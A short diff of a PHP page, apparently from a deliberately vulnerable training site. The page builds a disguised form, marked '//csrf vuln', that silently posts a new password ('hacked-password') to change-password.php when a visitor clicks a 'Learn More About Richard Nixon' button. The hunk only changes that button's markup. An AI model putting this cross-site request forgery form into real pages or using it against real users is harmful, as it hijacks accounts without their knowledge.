@@ -16,7 +16,7 @@ $mainContent .= "<p>As a locally-owned institution, we understand the unique nee
 //csrf vuln
 $mainContent .= "<form action=\"change-password.php\" method=\"POST\">";
 $mainContent .= "<input type=\"hidden\" name=\"password\" value=\"hacked-password\"/>";
-$mainContent .= "<input type=\"submit\" value=\"Learn More About Richard Nixon\"/>";
+$mainContent .= "<button type=\"submit\"/>Learn More About Richard Nixon</button>";
 $mainContent .= "</form>";
 $mainContent .= "<figure>";
 $mainContent .= "<img src=\"img/dick_nixon.jpg\">";
